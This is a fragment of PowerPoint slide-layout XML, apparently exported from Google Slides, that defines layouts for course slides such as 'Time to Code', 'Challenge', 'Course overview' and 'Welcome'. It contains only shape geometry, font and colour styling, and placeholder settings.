          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Google Shape;70;p10"/>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0"/>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0"/>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0"/>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0"/>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0"/>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6" name="Google Shape;76;p10"/>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7" name="Google Shape;77;p10"/>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8" name="Google Shape;78;p10"/>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9" name="Google Shape;79;p10"/>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80" name="Google Shape;80;p10"/>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81" name="Google Shape;81;p10"/>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82" name="Google Shape;82;p10"/>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83" name="Google Shape;83;p10"/>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84" name="Google Shape;84;p10"/>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85" name="Google Shape;85;p10"/>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0"/>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7" name="Google Shape;87;p10"/>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extLst>
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst>
        <p15:guide id="1" pos="28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 + Subheading blank">
  <p:cSld name="CUSTOM_11">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="88" name="Shape 88"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Google Shape;89;p11"/>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0" name="Google Shape;90;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="463231" y="548650"/>
            <a:ext cx="8229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Longer title" type="secHead">
  <p:cSld name="SECTION_HEADER">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="91" name="Shape 91"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="92" name="Google Shape;92;p12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4580627" y="16187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93" name="Google Shape;93;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4570700" y="1804650"/>
            <a:ext cx="4557900" cy="12159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94" name="Google Shape;94;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1127800"/>
            <a:ext cx="4572000" cy="185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95" name="Google Shape;95;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="32034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96" name="Google Shape;96;p12"/>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en" sz="800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>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extLst>
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst>
        <p15:guide id="1" orient="horz" pos="316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Shorter title">
  <p:cSld name="SECTION_HEADER_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="97" name="Shape 97"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="98" name="Google Shape;98;p13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3582395" y="1823650"/>
            <a:ext cx="920700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="49803"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="99" name="Google Shape;99;p13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3592327" y="1823550"/>
            <a:ext cx="56634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100" name="Google Shape;100;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3582400" y="2028900"/>
            <a:ext cx="4557900" cy="719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101" name="Google Shape;101;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3583700" y="1533250"/>
            <a:ext cx="4572000" cy="1809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102" name="Google Shape;102;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3583700" y="33144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03" name="Google Shape;103;p13"/>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Blank">
  <p:cSld name="CUSTOM_26_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="104" name="Shape 104"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3073400"/>
            <a:ext cx="9144000" cy="6861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sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>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06" name="Google Shape;106;p14"/>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4"/>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Next class">
  <p:cSld name="CUSTOM_10_1_1_1_2_2_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="108" name="Shape 108"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Google Shape;109;p1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Next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lass</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Google Shape;110;p15"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4429130" y="1541930"/>
            <a:ext cx="285844" cy="574072"/>
          </a:xfrm>
          <a:custGeom>
            <a:rect b="b" l="l" r="r" t="t"/>
            <a:pathLst>
              <a:path extrusionOk="0" fill="none" h="206130" w="102637">
                <a:moveTo>
                  <a:pt x="0" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="102637" y="103065"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="206129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solid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Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Google Shape;112;p15"/>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Time to Code">
  <p:cSld name="CUSTOM_10_1_1_1_2_2_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="113" name="Shape 113"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Google Shape;114;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5901175" y="3977950"/>
            <a:ext cx="2785500" cy="434400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="0" lIns="640075"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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Suggested Time:</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Google Shape;115;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3086100"/>
            <a:ext cx="9144000" cy="679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to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ode</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Google Shape;116;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="36576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7" name="Google Shape;117;p16"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3994290" y="1424853"/>
            <a:ext cx="1155368" cy="818142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Google Shape;118;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="4245725"/>
            <a:ext cx="3657600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" rtl="0" algn="r">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" rtl="0" algn="r">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hallenge">
  <p:cSld name="CUSTOM_10_1_1_1_2_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="119" name="Shape 119"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Google Shape;120;p17"/>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Challenge</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p1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22" name="Google Shape;122;p17"/>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3" name="Google Shape;123;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3872546" y="1094559"/>
            <a:ext cx="1390807" cy="121246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ourse overview">
  <p:cSld name="CUSTOM_10_1_1_1_2_1_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="124" name="Shape 124"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Google Shape;125;p18"/>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>ourse overview</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Google Shape;126;p1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
        <p:nvSpPr>
          <p:cNvPr id="127" name="Google Shape;127;p18"/>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8" name="Google Shape;128;p18"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4096605" y="1339647"/>
            <a:ext cx="950800" cy="97022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lank slide">
  <p:cSld name="CUSTOM_26_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="129" name="Shape 129"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3072384"/>
            <a:ext cx="9144000" cy="7047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b="0" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Google Shape;131;p19"/>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Welcome page">
  <p:cSld name="CUSTOM_26_1_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="132" name="Shape 132"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;133;p20"/>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chemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t>Welcome</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
